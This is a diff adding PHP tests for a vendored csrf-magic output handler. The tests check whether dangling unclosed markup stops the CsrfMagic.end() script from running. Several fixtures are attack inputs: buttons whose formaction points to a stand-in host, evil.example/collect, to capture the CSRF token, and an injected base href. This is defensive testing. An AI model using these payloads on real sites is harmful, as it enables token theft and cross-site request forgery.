@@ -181,3 +181,69 @@ test('only a base element the browser parses decides where relative actions go',
     'unclosed base' => array("<form method=post action=x.php></form><form method=post>{F}</form><base href='/kadupul/"),
     'base text in textarea only' => array("<textarea><base href='https://evil.example/'></textarea><form method=post action=x.php>{F}</form>"),
 ));
+
+// Runs the whole output handler with the browser script enabled, as
+// include/csrf.php configures it, and returns the page and the token field.
+function renderCsrfMagicPage(string $page): array
+{
+    $program = <<<'PHP'
+class CactiSecureHeaders { public static function getNonceAttribute() { return 'nonce="fixture"'; } }
+function csrf_startup() {
+    csrf_conf('rewrite', false);
+    csrf_conf('defer', true);
+    csrf_conf('auto-session', false);
+    csrf_conf('frame-breaker', false);
+    csrf_conf('secret', 'isolated-form-rewrite-test-secret');
+    csrf_conf('rewrite-js', '/kadupul/include/vendor/csrf/csrf-magic.js');
+}
+require $argv[1] . '/include/vendor/csrf/csrf-magic.php';
+session_id('form-rewrite-test-session');
+$field = "<input type='hidden' name='__csrf_magic' value=\"" . csrf_get_tokens() . "\" />";
+echo json_encode(array('field' => $field, 'page' => csrf_ob_handler($argv[2], 0)));
+PHP;
+
+    $process = proc_open(
+        array(PHP_BINARY, '-r', $program, dirname(__DIR__, 3), $page),
+        array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')),
+        $pipes
+    );
+    expect(is_resource($process))->toBeTrue();
+    $stdout = stream_get_contents($pipes[1]);
+    $stderr = stream_get_contents($pipes[2]);
+    fclose($pipes[1]);
+    fclose($pipes[2]);
+    expect(proc_close($process))->toBe(0)
+        ->and($stderr)->toBe('');
+
+    return json_decode($stdout, true, 512, JSON_THROW_ON_ERROR);
+}
+
+// The handler adds the CsrfMagic.end() call before </body>. Markup left open
+// after a form turns that call into text the browser never runs, while the
+// form keeps the field the server added. Only the submit check that
+// csrf-magic.js installs from the head can then withhold the token from a
+// cross-origin formaction, including a button associated with form="f".
+test('markup left open after a form keeps the CsrfMagic.end() call from running', function (string $open, string $close) {
+    $form = '<form method="post" id="f"><button formaction="//evil.example/collect">x</button></form>'
+        . '<button form="f" formaction="https://evil.example/collect">y</button>';
+    $result = renderCsrfMagicPage('<html><head></head><body>' . $form . $open . 'text</body></html>');
+    $page = $result['page'];
+    $script = strpos($page, 'src="/kadupul/include/vendor/csrf/csrf-magic.js"');
+    $field = strpos($page, '<form method="post" id="f">' . $result['field']);
+    $opened = strpos($page, $open);
+    $end = strpos($page, 'CsrfMagic.end();');
+
+    expect($script)->toBeInt()
+        ->and($field)->toBeInt()->toBeGreaterThan($script)
+        ->and($opened)->toBeGreaterThan($field)
+        ->and($end)->toBeGreaterThan($opened);
+    if ($close !== '') {
+        expect(stripos(substr($page, $opened + strlen($open)), $close))->toBeFalse();
+    }
+})->with(array(
+    'unclosed plaintext' => array('<plaintext>', ''),
+    'unclosed textarea' => array('<textarea>', '</textarea'),
+    'unclosed title' => array('<title>', '</title'),
+    'unclosed xmp' => array('<xmp>', '</xmp'),
+    'unclosed comment' => array('<!--', '-->'),
+));
